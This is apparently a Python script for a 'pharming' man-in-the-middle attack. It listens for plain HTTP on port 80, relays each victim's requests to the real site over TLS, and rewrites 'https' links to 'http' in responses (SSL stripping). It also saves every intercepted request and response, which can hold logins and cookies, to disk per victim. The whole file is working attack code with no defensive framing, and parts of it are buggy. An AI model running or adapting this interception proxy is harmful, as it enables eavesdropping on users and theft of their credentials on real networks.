"""
참고: https://docs.python.org/ko/3/library/ssl.html
"""

from typing import Dict

import socket
import ssl
import threading
import os
import time
import hashlib

MAX_LISTEN = 1
MAX_DATA_LEN = 1024

HTTP = 80
HTTPS = 443

SSL_CONTEXT: ssl.SSLContext = None


class SendRecv():
    sock: socket.socket = None
    
    def recv(self):
        data = b""
        while (1):
            msg = self.sock.recv(MAX_DATA_LEN)
            data += msg
            if len(msg) != MAX_DATA_LEN:
                break
        return data

    def send(self, data):
        return self.sock.send(data)

    def close(self):
        self.sock.close()


class Client(SendRecv):
    
    def __init__(self, sock) -> None:
        self.sock = sock

    def recv(self):
        data = super().recv()
        print("[CLIENT -> MITM]", len(data))
        return data

    def send(self, data):
        print("[CLIENT <- MITM]", len(data))
        return super().send(data)


class Server(SendRecv):
    server_name: str = None
    sock_http: socket.socket = None

    def __init__(self, server_name):
        self.server_name = server_name
        self.sock_http = socket.create_connection((server_name, HTTPS))
        self.sock = SSL_CONTEXT.wrap_socket(self.sock_http, server_hostname=server_name)

    def recv(self):
        data = super().recv()
        print("[MITM <- SERVER]", len(data))
        return data

    def send(self, data):
        print("[MITM -> SERVER]", len(data))
        return super().send(data)

    def close(self):
        self.sock_http.close()
        super().close()


class Pharming():
    sock: socket.socket = None
    client: Client = None
    server: Server = None
    start_time: str = None

    def __init__(self) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(('', HTTP))
        self.sock.listen(MAX_LISTEN)
        self.start_time = strftime()

    def run(self):
        print("[+] Start at", self.start_time)
        try:
            while 1:
                t = threading.Thread(target=self.attack, args=get_client_sock(self.sock))
                t.daemon = True
                t.start()
        except KeyboardInterrupt:
            self.sock.close()

    def attack(self, sock: socket.socket, addr):
        client = Client(sock)
        recv_bytes = client.recv()
        server_name = parse_to_packet(recv_bytes)[b'Host'].strip().decode()
        self.save(addr, "request", recv_bytes, server_name)
        
        server = Server(server_name)
        server.send(recv_bytes)
        recv_bytes = server.recv()
        server.close()

        repair_recv = packet_body_replace(recv_bytes, b"https", b"http")
        client.send(repair_recv)
        self.save(addr, "response", repair_recv, server_name)
        client.close()

    def save(self, addr, direction, data: bytes, server_name):
        filename = f"./pharming/{self.start_time}/{server_name}/{addr}/{strftime()}-{str(time.time()).partition('.')[2]}-{direction}"
        os.makedirs(filename.rpartition('/')[0], exist_ok=True)
        with open(filename, "wb") as f: f.write(data)


def strftime():
    return time.strftime('%Y%m%d-%H%M%S')

def packet_body_replace(packet: bytes, befo, aft):
    header, body = packet.split(b"\r\n\r\n")
    decomp = decompress(body.partition(b"\r\n")[2].strip(b"\r\n"))
    comp = compress(decomp)
    return header+b"\r\n\r\n"+comp.replace(befo, aft)+b"\r\n"

def parse_to_packet(packet: bytes) -> Dict[bytes, bytes]:
    header_bytes, body = packet.split(b"\r\n\r\n")
    body = body.strip(b"\r\n")

    header = {}
    for i in header_bytes.split(b"\r\n"):
        key, _, value = i.partition(b":")
        header[key] = value

    return header


def get_client_sock(sock: socket.socket):
    clientSock, addr = sock.accept()
    print("\n[+] Connected by", addr)
    return clientSock, addr[0]

def random_hash():
    return hashlib.sha256(os.urandom(16)).hexdigest()
    
def decompress(compressed: bytes) -> bytes:
    tmp_file = random_hash()
    with open(tmp_file, "wb") as f: f.write(compressed)
    os.system(f"cat {tmp_file} | gzip -d > _{tmp_file} 2>/dev/null")
    with open("_"+tmp_file, "rb") as f: result = f.read()
    os.remove(tmp_file)
    os.remove("_"+tmp_file)
    return result

def compress(string: bytes) -> bytes:
    tmp_file = random_hash()
    with open(tmp_file, "wb") as f: f.write(string)
    os.system(f"gzip {tmp_file} 2>/dev/null")
    with open(tmp_file+".gz", "rb") as f: result = f.read()
    os.remove(tmp_file+".gz")
    return result




def main():
    global SSL_CONTEXT
    SSL_CONTEXT = ssl.create_default_context()

    pharming = Pharming()
    pharming.run()

if __name__ == "__main__":
    main()
